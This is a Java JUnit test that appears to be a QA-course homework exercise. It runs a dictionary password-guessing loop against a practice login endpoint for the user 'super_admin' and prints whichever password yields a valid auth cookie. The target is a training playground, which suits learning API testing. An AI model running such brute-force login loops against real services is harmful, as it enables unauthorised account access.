import io.restassured.RestAssured;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.io.File;
import java.util.HashMap;
import java.util.Map;
import java.util.HashSet;
import java.util.Set;

public class Ex9PasswordCrackingCookiesTest {

    @Test
    public void testGetCookies() {
        File F = new File("C:\\Projects\\QA_JavaAPI\\test_data\\psw_data.json");
        JsonPath pw = new JsonPath(F);
        // List<String> pwList = pw.getList("psw"); // вариант1: делаем лист из содержимого элемента psw, который является массивом с паролями , из json
        Set<String> pwList = new HashSet<>(pw.getList("psw")); // вариант2: делаем из листа сет, все дубликаты паролей должны уничтожиться при добавлении

        for (String currentPW : pwList) {
            Map<String, String> data = new HashMap<>();
            data.put("login", "super_admin");
            data.put("password", currentPW);
            Response response = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String responseCookie = response.getCookie("auth_cookie");
            // System.out.println(responseCookie);

            Map<String, String> cookies = new HashMap<>();
            if (responseCookie != null) {
                cookies.put("auth_cookie", responseCookie);
            }

            Response responseForCheck = RestAssured
                    .given()
                    .body(data)
                    .cookies(cookies)
                    .when()
                    .post("https://playground.learnqa.ru/api/check_auth_cookie")
                    .andReturn();
            String responseBody = responseForCheck.getBody().asString();
            if (!responseBody.equals("You are NOT authorized")) {
                System.out.println(currentPW);
                System.out.println(responseBody);
                break;
            }
        }
    }
}



